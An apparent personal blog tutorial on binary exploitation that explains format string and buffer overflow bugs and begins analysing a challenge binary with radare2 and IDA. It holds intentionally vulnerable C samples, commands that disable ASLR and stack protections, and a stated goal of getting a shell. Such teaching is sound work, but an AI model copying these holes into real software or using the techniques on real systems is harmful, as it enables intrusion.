<!DOCTYPE HTML>
<html lang="en-EN">


<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta name="keywords" content="Binary Exploitation - Format String + Buffer Overflow Vulnerability, D4mianWayne">
    <meta name="description" content="The Boy Wonder">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-144686323-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'UA-144686323-1');
</script>


    <title>Binary Exploitation - Format String + Buffer Overflow Vulnerability | Pwning</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Pwning</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>home</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>tags</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>Categories</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>Archives</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle-o" style="zoom: 0.6;"></i>
      
      <span>About</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Pwning</div>
        <div class="logo-desc">
            
            The Boy Wonder
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			home
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			tags
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			Categories
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			Archives
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle-o"></i>
			
			About
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/D4mianWayne" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>My Github
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/D4mianWayne" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="My Github" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Binary Exploitation - Format String + Buffer Overflow Vulnerability</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    .toc-fixed .toc-link::before{
        position: fixed!important;/*当toc的位置改为fixed时，.toc-link::before也要改为fixed*/
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link::before {
        background-color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/pwn-fmtstr-bof/">
                                <span class="chip bg-color">pwn, fmtstr, bof</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/Binary-Exploitation/" class="post-category">
                                Binary Exploitation
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
                    2018-09-12
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
                    3.4k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
                    20 Min
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to get a shell.</p>
<h1 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h1><p>I want to write this post because while I was trying to learn more about binary exploitation, I came across this interesting challenge as this shows how a two way vulnerability would be used to bypass stack canary protection and executable stack and let you use the buffer overflow vulnerability.</p>
<blockquote>
<p>Warning: This post will be long and detailed enough, so hang in there.</p>
</blockquote>
<h1 id="What-is-Format-String-Vulnerability"><a href="#What-is-Format-String-Vulnerability" class="headerlink" title="What is Format String Vulnerability?"></a>What is Format String Vulnerability?</h1><p>At first, let’s start as we normally would. Format string as in C used to specify the the way data is going to be printed to the screen or console. Consider the following program:-</p>
<pre class=" language-C"><code class="language-C">#include<stdio.h>

int main(int argc, char *argv[])
{
     printf(argv[1]); /* No format specifier - here's the vulnerability */
     printf("\n");
     return 0;
}</code></pre>
<p>Let’s compile this:-</p>
<pre class=" language-bash"><code class="language-bash">robin@oracle:/tmp$ gcc -o new new.c
new.c: In <span class="token keyword">function</span> ‘main’:
new.c:3:6: warning: implicit declaration of <span class="token keyword">function</span> ‘printf’ <span class="token punctuation">[</span>-Wimplicit-function-declaration<span class="token punctuation">]</span>
      printf<span class="token punctuation">(</span>argv<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> /* No <span class="token function">format</span> specifier */
      ^~~~~~
new.c:3:6: warning: incompatible implicit declaration of built-in <span class="token keyword">function</span> ‘printf’
new.c:3:6: note: include ‘<span class="token operator">&lt;</span>stdio.h<span class="token operator">></span>’ or provide a declaration of ‘printf’
new.c:3:6: warning: <span class="token function">format</span> not a string literal and no <span class="token function">format</span> arguments <span class="token punctuation">[</span>-Wformat-security<span class="token punctuation">]</span>  <span class="token operator">&lt;</span>--- Warning <span class="token keyword">for</span> no <span class="token function">format</span> specification 
</code></pre>
<p>Ah, so we got a warning(intended one), let’s run:-</p>
<pre class=" language-bash"><code class="language-bash">robin@oracle:/tmp$ ./new Hello
Hello  <span class="token operator">&lt;</span>-- Works fine<span class="token operator">!</span>  
robin@oracle:/tmp$ ./new %x
d24f0e8 <span class="token operator">&lt;</span>-- Wait, what?</code></pre>
<p>As you can see it works fine if we give it a string or something else but as soon as we give it a hex format specifier it gives hex data. In case you’re wondering, that hex data is an actual address from the program stack. Thus, if there’s no format specifier in a program and the data is being printed or shown accordingly, we can use a format specifier as an input parameter to leak stack addresses for own use.</p>
<h1 id="What-is-Buffer-Overflow"><a href="#What-is-Buffer-Overflow" class="headerlink" title="What is Buffer Overflow?"></a>What is Buffer Overflow?</h1><p>I’m sure that most of you know what it is but still let’s have a recap. Buffer overflow vulnerability occurs when a user gives more input than it was supposed to handle hence making the memory region to overflow by the input. If used smartly, it can be used for many gains.</p>
<p>Consider the following program:-</p>
<pre class=" language-C"><code class="language-C">#include<stdio.h>
#include<stdlib.h>

void winner()
{
 system("/bin/bash");
} 

int main()
{
 char buf[10];
 scanf("%s",buf);
 printf("Hello %s",buf);
 return 0;
}</code></pre>
<p>PS: It was the only simple thing I could think of.</p>
<p>So, as you can see it takes 10 characters as input and display them. Let’s compile it and turn off the protections to make it work:</p>
<pre class=" language-bash"><code class="language-bash">robin@oracle:/tmp$ <span class="token function">sudo</span> <span class="token function">bash</span> -c <span class="token string">'echo 0 > /proc/sys/kernel/randomize_va_space'</span> <span class="token comment" spellcheck="true"># Turn off the ASLR(Address Space Layout Randomization)</span>
robin@oracle:/tmp$ gcc -o bof -fno-stack-protector -z execstack bof.c  <span class="token comment" spellcheck="true"># Makes Stack Executable and turn off stack smashing</span></code></pre>
<p>It’s compiled now, time to run it:-</p>
<pre class=" language-bash"><code class="language-bash">robin@oracle:/tmp$ ./bof
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault <span class="token punctuation">(</span>core dumped<span class="token punctuation">)</span></code></pre>
<p>A Segementation Fault, we have a buffer overflow vulnerability here.</p>
<blockquote>
<p>Note: The Buffer Overflow program, consider it as a challenge and complete it. Go Pwn! </p>
</blockquote>
<h1 id="Protections-on-Binaries"><a href="#Protections-on-Binaries" class="headerlink" title="Protections on Binaries"></a>Protections on Binaries</h1><p>As you saw earlier, I used some gcc flags to turn off the standard protections. This process is commonly referred to as hardening as these protections prevents the vulnerability to be exploited and hence makes it harder for us to exploit it. These protections includes:-</p>
<ul>
<li>Buffer overflow protection</li>
<li>Stack overwriting protection</li>
<li>Position independent executables (see Address space layout randomization)</li>
<li>Binary stirring (randomizing the address of basic blocks)</li>
<li>Pointer masking (protection against code injection)</li>
<li>Control flow randomization (to protect against control flow diversion)</li>
</ul>
<p>Following are the protections, we will deal with:- </p>
<h4 id="Stack-Canaries"><a href="#Stack-Canaries" class="headerlink" title="Stack Canaries"></a>Stack Canaries</h4><p>This method works by placing a small integer, the value of which is randomly chosen at program start, in memory just before the stack return pointer. Most buffer overflows overwrite memory from lower to higher memory addresses, so in order to overwrite the return pointer (and thus take control of the process) the canary value must also be <strong>overwritten</strong>. This value is checked to make sure it has not changed before a routine uses the return pointer on the stack.</p>
<h4 id="Non-Executable-Stack"><a href="#Non-Executable-Stack" class="headerlink" title="Non-Executable Stack"></a>Non-Executable Stack</h4><p>Another approach to preventing stack buffer overflow exploitation is to enforce a memory policy on the stack memory region that disallows execution from the stack. This means that in order to execute shellcode from the stack an attacker must either find a way to disable the execution protection from memory, or find a way to put her/his shellcode payload in a non-protected region of memory.<br>Even if this were not so, there are other ways. The most damning is the so-called return to libc method for shellcode creation. In this attack the malicious payload will load the stack not with shellcode, but with a proper call stack so that execution is vectored to a chain of standard library calls, usually with the effect of disabling memory execute protections and allowing shellcode to run as normal. This works because the execution never actually vectors to the stack itself.<br>A variant of return-to-libc is return-oriented programming (ROP), which sets up a series of return addresses, each of which executes a small sequence of cherry-picked machine instructions within the existing program code or system libraries, sequence which ends with a return. These so-called gadgets each accomplish some simple register manipulation or similar execution before returning, and stringing them together achieves the attacker’s ends. It is even possible to use “returnless” return-oriented programming by exploiting instructions or groups of instructions that behave much like a return instruction.</p>
<blockquote>
<p>This is an ongoing series on my blog.</p>
</blockquote>
<h1 id="main"><a href="#main" class="headerlink" title="main"></a><strong>main</strong></h1><p>Now, let’s get started:-</p>
<h5 id="Attached-files"><a href="#Attached-files" class="headerlink" title="Attached files:"></a>Attached files:</h5><p><a href="/files/binary/q3">q3</a></p>
<h3 id="Analysing-the-binary"><a href="#Analysing-the-binary" class="headerlink" title="Analysing the binary"></a>Analysing the binary</h3><p>Let’s analyse or reverse enginner the binary first, I’ll be using radare2 for disassembly and IDA Pro for decompiled functions:-</p>
<pre class=" language-r"><code class="language-r">robin<span class="token operator">@</span>oracle<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">$</span> r2 <span class="token operator">-</span>AAAA q3

<span class="token operator">-</span><span class="token operator">-</span>snip<span class="token operator">-</span><span class="token operator">-</span>

<span class="token punctuation">[</span><span class="token number">0x00000670</span><span class="token punctuation">]</span><span class="token operator">></span> afl
<span class="token number">0x00000000</span>    <span class="token number">3</span> <span class="token number">72</span>   <span class="token operator">-></span> <span class="token number">73</span>   sym.imp.__libc_start_main
<span class="token number">0x000005f8</span>    <span class="token number">3</span> <span class="token number">23</span>           sym._init
<span class="token number">0x00000620</span>    <span class="token number">1</span> <span class="token number">6</span>            sym.imp.puts
<span class="token number">0x00000630</span>    <span class="token number">1</span> <span class="token number">6</span>            sym.imp.__stack_chk_fail
<span class="token number">0x00000640</span>    <span class="token number">1</span> <span class="token number">6</span>            sym.imp.printf
<span class="token number">0x00000650</span>    <span class="token number">1</span> <span class="token number">6</span>            sym.imp.fgets
<span class="token number">0x00000660</span>    <span class="token number">1</span> <span class="token number">6</span>            sub.__cxa_finalize_248_660
<span class="token number">0x00000670</span>    <span class="token number">1</span> <span class="token number">43</span>           entry0
<span class="token number">0x000006a0</span>    <span class="token number">4</span> <span class="token number">50</span>   <span class="token operator">-></span> <span class="token number">40</span>   sym.deregister_tm_clones
<span class="token number">0x000006e0</span>    <span class="token number">4</span> <span class="token number">66</span>   <span class="token operator">-></span> <span class="token number">57</span>   sym.register_tm_clones
<span class="token number">0x00000730</span>    <span class="token number">4</span> <span class="token number">49</span>           sym.__do_global_dtors_aux
<span class="token number">0x00000770</span>    <span class="token number">1</span> <span class="token number">10</span>           entry1.init
<span class="token number">0x0000077a</span>    <span class="token number">3</span> <span class="token number">182</span>          sym.main
<span class="token number">0x00000830</span>    <span class="token number">4</span> <span class="token number">101</span>          sym.__libc_csu_init
<span class="token number">0x000008a0</span>    <span class="token number">1</span> <span class="token number">2</span>            sym.__libc_csu_fini
<span class="token number">0x000008a4</span>    <span class="token number">1</span> <span class="token number">9</span>            sym._fini</code></pre>
<p>No special function is seen here, let’s disassemble <code>main</code>:-</p>
<pre class=" language-r"><code class="language-r"><span class="token punctuation">[</span><span class="token number">0x00000670</span><span class="token punctuation">]</span><span class="token operator">></span> pdf <span class="token operator">@</span>main
            <span class="token punctuation">;</span><span class="token operator">-</span><span class="token operator">-</span> main<span class="token operator">:</span>
<span class="token operator">/</span> <span class="token punctuation">(</span>fcn<span class="token punctuation">)</span> sym.main <span class="token number">182</span>
<span class="token operator">|</span>   sym.main <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">|</span>           <span class="token punctuation">;</span> var FILE local_28h <span class="token operator">@</span> rbp<span class="token operator">-</span><span class="token number">0x28</span>
<span class="token operator">|</span>           <span class="token punctuation">;</span> var int local_20h <span class="token operator">@</span> rbp<span class="token operator">-</span><span class="token number">0x20</span>
<span class="token operator">|</span>           <span class="token punctuation">;</span> var int local_18h <span class="token operator">@</span> rbp<span class="token operator">-</span><span class="token number">0x18</span>
<span class="token operator">|</span>           <span class="token punctuation">;</span> var int local_8h <span class="token operator">@</span> rbp<span class="token operator">-</span><span class="token number">0x8</span>
<span class="token operator">|</span>              <span class="token punctuation">;</span> DATA XREF from <span class="token number">0x0000068d</span> <span class="token punctuation">(</span>entry0<span class="token punctuation">)</span>
<span class="token operator">|</span>           <span class="token number">0x0000077a</span>      <span class="token number">55</span>             push rbp
<span class="token operator">|</span>           <span class="token number">0x0000077b</span>      <span class="token number">4889e5</span>         mov rbp<span class="token punctuation">,</span> rsp
<span class="token operator">|</span>           <span class="token number">0x0000077e</span>      4883ec30       sub rsp<span class="token punctuation">,</span> <span class="token number">0x30</span>               <span class="token punctuation">;</span> <span class="token string">'0'</span>
<span class="token operator">|</span>           <span class="token number">0x00000782</span>      64488b042528.  mov rax<span class="token punctuation">,</span> qword fs<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">]</span>    <span class="token punctuation">;</span> <span class="token punctuation">[</span><span class="token number">0x28</span><span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x19e0</span> <span class="token punctuation">;</span> <span class="token string">'('</span>
<span class="token operator">|</span>           <span class="token number">0x0000078b</span>      488945f8       mov qword <span class="token punctuation">[</span>local_8h<span class="token punctuation">]</span><span class="token punctuation">,</span> rax
<span class="token operator">|</span>           <span class="token number">0x0000078f</span>      31c0           xor eax<span class="token punctuation">,</span> eax
<span class="token operator">|</span>           <span class="token number">0x00000791</span>      48c745e00000.  mov qword <span class="token punctuation">[</span>local_20h<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span>
<span class="token operator">|</span>           <span class="token number">0x00000799</span>      48c745e80000.  mov qword <span class="token punctuation">[</span>local_18h<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span>
<span class="token operator">|</span>           <span class="token number">0x000007a1</span>      488b05680820.  mov rax<span class="token punctuation">,</span> qword <span class="token punctuation">[</span>obj.stdin<span class="token punctuation">]</span>  <span class="token punctuation">;</span> loc.stdin <span class="token punctuation">;</span> <span class="token punctuation">[</span><span class="token number">0x201010</span><span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>
<span class="token operator">|</span>           <span class="token number">0x000007a8</span>      488945d8       mov qword <span class="token punctuation">[</span>local_28h<span class="token punctuation">]</span><span class="token punctuation">,</span> rax
<span class="token operator">|</span>           <span class="token number">0x000007ac</span>      488d3d010100.  lea rdi<span class="token punctuation">,</span> qword str.Enter_name_<span class="token operator">:</span> <span class="token punctuation">;</span> <span class="token number">0x8b4</span> <span class="token punctuation">;</span> <span class="token string">"Enter name : "</span> <span class="token punctuation">;</span> const char <span class="token operator">*</span> format
<span class="token operator">|</span>           <span class="token number">0x000007b3</span>      b800000000     mov eax<span class="token punctuation">,</span> <span class="token number">0</span>
<span class="token operator">|</span>           <span class="token number">0x000007b8</span>      e883feffff     call sym.imp.printf         <span class="token punctuation">;</span> int printf<span class="token punctuation">(</span>const char <span class="token operator">*</span>format<span class="token punctuation">)</span>
<span class="token operator">|</span>           <span class="token number">0x000007bd</span>      488b55d8       mov rdx<span class="token punctuation">,</span> qword <span class="token punctuation">[</span>local_28h<span class="token punctuation">]</span>  <span class="token punctuation">;</span> FILE <span class="token operator">*</span>stream
<span class="token operator">|</span>           <span class="token number">0x000007c1</span>      488d45e0       lea rax<span class="token punctuation">,</span> qword <span class="token punctuation">[</span>local_20h<span class="token punctuation">]</span>
<span class="token operator">|</span>           <span class="token number">0x000007c5</span>      be10000000     mov esi<span class="token punctuation">,</span> <span class="token number">0x10</span>               <span class="token punctuation">;</span> int size
<span class="token operator">|</span>           <span class="token number">0x000007ca</span>      4889c7         mov rdi<span class="token punctuation">,</span> rax                <span class="token punctuation">;</span> char <span class="token operator">*</span>s
<span class="token operator">|</span>           <span class="token number">0x000007cd</span>      e87efeffff     call sym.imp.fgets          <span class="token punctuation">;</span> char <span class="token operator">*</span>fgets<span class="token punctuation">(</span>char <span class="token operator">*</span>s<span class="token punctuation">,</span> int size<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span>
<span class="token operator">|</span>           <span class="token number">0x000007d2</span>      488d3de90000.  lea rdi<span class="token punctuation">,</span> qword str.Hello    <span class="token punctuation">;</span> <span class="token number">0x8c2</span> <span class="token punctuation">;</span> <span class="token string">"Hello"</span> <span class="token punctuation">;</span> const char <span class="token operator">*</span> s
<span class="token operator">|</span>           <span class="token number">0x000007d9</span>      e842feffff     call sym.imp.puts           <span class="token punctuation">;</span> int puts<span class="token punctuation">(</span>const char <span class="token operator">*</span>s<span class="token punctuation">)</span>
<span class="token operator">|</span>           <span class="token number">0x000007de</span>      488d45e0       lea rax<span class="token punctuation">,</span> qword <span class="token punctuation">[</span>local_20h<span class="token punctuation">]</span>
<span class="token operator">|</span>           <span class="token number">0x000007e2</span>      4889c7         mov rdi<span class="token punctuation">,</span> rax                <span class="token punctuation">;</span> const char <span class="token operator">*</span> format
<span class="token operator">|</span>           <span class="token number">0x000007e5</span>      b800000000     mov eax<span class="token punctuation">,</span> <span class="token number">0</span>
<span class="token operator">|</span>           <span class="token number">0x000007ea</span>      e851feffff     call sym.imp.printf         <span class="token punctuation">;</span> int printf<span class="token punctuation">(</span>const char <span class="token operator">*</span>format<span class="token punctuation">)</span>
<span class="token operator">|</span>           <span class="token number">0x000007ef</span>      488d3dd20000.  lea rdi<span class="token punctuation">,</span> qword str.Enter_sentence_<span class="token operator">:</span> <span class="token punctuation">;</span> <span class="token number">0x8c8</span> <span class="token punctuation">;</span> <span class="token string">"Enter sentence : "</span> <span class="token punctuation">;</span> const char <span class="token operator">*</span> format
<span class="token operator">|</span>           <span class="token number">0x000007f6</span>      b800000000     mov eax<span class="token punctuation">,</span> <span class="token number">0</span>
<span class="token operator">|</span>           <span class="token number">0x000007fb</span>      e840feffff     call sym.imp.printf         <span class="token punctuation">;</span> int printf<span class="token punctuation">(</span>const char <span class="token operator">*</span>format<span class="token punctuation">)</span>
<span class="token operator">|</span>           <span class="token number">0x00000800</span>      488b55d8       mov rdx<span class="token punctuation">,</span> qword <span class="token punctuation">[</span>local_28h<span class="token punctuation">]</span>  <span class="token punctuation">;</span> FILE <span class="token operator">*</span>stream
<span class="token operator">|</span>           <span class="token number">0x00000804</span>      488d45e0       lea rax<span class="token punctuation">,</span> qword <span class="token punctuation">[</span>local_20h<span class="token punctuation">]</span>
<span class="token operator">|</span>           <span class="token number">0x00000808</span>      be00010000     mov esi<span class="token punctuation">,</span> <span class="token number">0x100</span>              <span class="token punctuation">;</span> int size
<span class="token operator">|</span>           <span class="token number">0x0000080d</span>      4889c7         mov rdi<span class="token punctuation">,</span> rax                <span class="token punctuation">;</span> char <span class="token operator">*</span>s
<span class="token operator">|</span>           <span class="token number">0x00000810</span>      e83bfeffff     call sym.imp.fgets          <span class="token punctuation">;</span> char <span class="token operator">*</span>fgets<span class="token punctuation">(</span>char <span class="token operator">*</span>s<span class="token punctuation">,</span> int size<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span>
<span class="token operator">|</span>           <span class="token number">0x00000815</span>      b800000000     mov eax<span class="token punctuation">,</span> <span class="token number">0</span>
<span class="token operator">|</span>           <span class="token number">0x0000081a</span>      488b4df8       mov rcx<span class="token punctuation">,</span> qword <span class="token punctuation">[</span>local_8h<span class="token punctuation">]</span>
<span class="token operator">|</span>           <span class="token number">0x0000081e</span>      6448330c2528.  xor rcx<span class="token punctuation">,</span> qword fs<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">]</span>
<span class="token operator">|</span>       <span class="token punctuation">,</span><span class="token operator">=</span><span class="token operator">&lt;</span> <span class="token number">0x00000827</span>      <span class="token number">7405</span>           je <span class="token number">0x82e</span>
<span class="token operator">|</span>       <span class="token operator">|</span>   <span class="token number">0x00000829</span>      e802feffff     call sym.imp.__stack_chk_fail <span class="token punctuation">;</span> void __stack_chk_fail<span class="token punctuation">(</span>void<span class="token punctuation">)</span>
<span class="token operator">|</span>       <span class="token operator">|</span>      <span class="token punctuation">;</span> JMP XREF from <span class="token number">0x00000827</span> <span class="token punctuation">(</span>sym.main<span class="token punctuation">)</span>
<span class="token operator">|</span>       `<span class="token operator">-></span> <span class="token number">0x0000082e</span>      c9             leave
\           <span class="token number">0x0000082f</span>      c3             ret</code></pre>
<p>First input is getting printed and as you can see at line <code>0x000007d2      488d3de90000.  lea rdi, qword str.Hello    ; 0x8c2 ; &quot;Hello&quot; ; const char * s</code> there’s no specifier at the commented string otherwise radare2 would’ve been able to show it. And since it’s getting printed with <code>0x000007ea      e851feffff     call sym.imp.printf         ; int printf(const char *format)</code> instruction we know where the format string vulerability is.</p>
<p>For ease of understanding, we have a decompiled function with the help of IDA:-</p>
<pre class=" language-C"><code class="language-C">int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // ST08_8
  char s[8]; // [rsp+10h] [rbp-20h]
  __int64 v6; // [rsp+18h] [rbp-18h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  *(_QWORD *)s = 0LL;
  v6 = 0LL;
  stream = (FILE *)_bss_start;
  printf("Enter name : ", argv, envp);
  fgets(s, 16, stream);
  puts("Hello");
  printf(s, 16LL);  <-- Here's the vulnerability, just like in that example, isn't it?
  printf("Enter sentence : ");
  fgets(s, 256, stream);
  return 0;
}</code></pre>
